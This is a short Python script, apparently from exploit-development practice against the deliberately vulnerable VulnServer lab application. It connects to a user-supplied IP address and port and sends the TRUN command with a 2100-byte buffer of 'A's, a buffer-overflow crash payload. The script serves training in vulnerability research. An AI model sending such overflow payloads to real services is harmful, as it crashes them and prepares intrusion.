#!/usr/bin/python3
import sys,socket
from time import sleep

print("************VulnServer TRUN**********")

ip_address=input("Enter the IP address\n")
port_number=input("Enter the port number\n")

if (len(ip_address)<=0) or (len(port_number)<=0):
    if (len(ip_address)>0) and (len(port_number)<=0):
        print("*" * 30)
        print("Port number field is empty")
    elif (len(ip_address)<=0) and (len(port_number)>0):
        print("*" * 30)
        print("IP Address field is empty")
    elif (len(ip_address)<=0) and (len(port_number)<=0):
        print("*" * 30)
        print("IP Address field is empty")
        print("Port number field is empty")
    else:
        print("*" * 30)
        print("Issues with the user input")
else:
    size=2100
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip_address, int(port_number)))
    print(f"Sending buffer --> {size}")
    s.send(b"TRUN /.:/" + b"A"*size)
    s.close()
